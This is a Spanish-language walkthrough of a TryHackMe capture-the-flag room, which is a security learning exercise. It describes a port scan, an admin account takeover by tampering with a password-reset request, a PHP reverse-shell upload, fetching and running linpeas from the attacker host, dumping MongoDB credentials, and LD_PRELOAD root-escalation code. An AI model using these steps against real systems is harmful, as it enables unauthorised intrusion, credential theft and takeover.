De nuevo, otra sala en tryhackme. Como siempre, enumeramos puertos abiertos con nuestra herramienta bien conocida, buscaremos directorios ocultos dentro del servidor web y haremos uso de burp-suite para generar una shell en nuestro sistema. Luego, enumeramos la maquina por posibles brechas de seguridad y establecemos una conexion ssh al usuairo. Por ultimo, escalamos privilegios con una tecnica conocida de LD_PRELOAD.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-17 14:54:18 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap nos muestra 2 puertos abiertos. Navegamos al servidor web para ver a que estamos comprometiendo y miramos el page source como siempre para ver si podemos encontrar algo. Iniciamos una busqueda a directorios ocultos en el servidor web con gobuster.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/17 14:43:03 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/phpMyAdmin (Status: 301)
/server-status (Status: 403)
/v2 (Status: 301)
=====================================================
2023/07/17 14:44:49 Finished
=====================================================
```


Tendremos varias rutas, intente encontrar alguna vulnerabilidad para phpMyAdmin, e introduje una consulta de sqli para ver si funcionaba pero no tuve exito, me salio un error que requeria usar el protocolo https. 

Nos movemos al directorio /v2, en el que encontramos una sesion de logeo. 

# Intrusion

Creamos una cuenta de testeo para poder ingresar y ver la interfaz de la pagina web. Si nos dirigimos a nuestro perfil, y queremos cambiar de foto en nuestra cuenta. Podemos notar un mensaje, que solo puede subir imagenes el mail "admin@sky.thm".

Para hacer esto, tenemos que dirigirnos al apartado de **Reset User**. Luego, interceptamos el trafico con Burp-Suite al clickear en **Submit**. Enviamos la respuesta al **Repeater** y cambiamos nuestro mail test por el que encontramos anteriormente.

Con esto, cambiaremos la password de admin, y podremos entrar con su cuenta para cargar y ejecutar nuestra reverse shell. Nos logeamos con las credenciales nuevas.

Utilizamos la shell de PentestMonkey, la cargamos al servidor web y nos dirigimos a la ruta donde se almacena nuestra shell:

```bash
# Nos ponemos en escucha
nc -nvlp LPORT

# Navegamos al sitio web
http://IPTARGET/v2/profileimages/shell.php
```

Upgradeamos nuestra shell

```bash
script /dev/null -c bash
  CTRL+Z
  stty raw -echo;fg
  export TERM=xterm
```

Al enumerar los usuarios en el sistema, podemos notar que posee una base de datos mongodb

```bash
cat /etc/passwd

mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
mongodb:x:114:65534::/home/mongodb:/usr/sbin/nologin
```

Nos transferimos la herramienta linpeas, para hacer la tarea mas facil y que nos encuentre la ruta donde se almacena las configuraciones.

```bash
# Abrimos servidor python en el directorio linpeas de nuestra maquina atacante
python3 -m http.server 8080

# Dentro de la maquina victima
cd /dev/shm
wget http://LHOST:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Encontramos
mongodb       Ssl  18:42   0:23 /usr/bin/mongod --config /etc/mongod.conf
```

Hacemos uso de la base de datos mongo y listamos usuarios siguiendo los pasos a continuacion

```ruby
mongo # Inicia servicio mongo
show databases # Muestra bases de datos
use backup # Cambia a backup
show tables; # Muestra tablas
db.user.find() # Enlista usuarios

{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "REDACTED" }
```

Establecemos conexion ssh a webdeveloper.

```bash
ssh webdeveloper@IPTARGET
```

# Priv.Escalation

Primero, listamos los permisos de superusuario que posee webdeveloper. 

```bash
sudo -l

Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

Tenemos que prestar atencion a "LD_PRELOAD", ya que existe una escalada de privilegios que nos permite obtener una shell como usuario raiz root.

Lo primero que debemos hacer, es crear un directorio en /tmp, llamalo como desees.  Luego, pegamos esta tecnica de escalada de privilegios que utiliza funciones y bibliotecas para obtener una shell en root.

```bash
mkdir /tmp/hello
nano hi.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Una vez creado, compilamos el archivo fuente "hi.c" en una biblioteca compartida "hi.so", para luego ejecutar este mismo archivo, con permisos sudo.

```bash
gcc -fPIC -shared -o hi.so hi.c -nostartfiles
sudo LD_PRELOAD=/tmp/hello/hi.so /usr/bin/sky_backup_utility
```

Informacion obtenida https://blog.certcube.com/sudo-ld_preload-linux-privilege-escalation/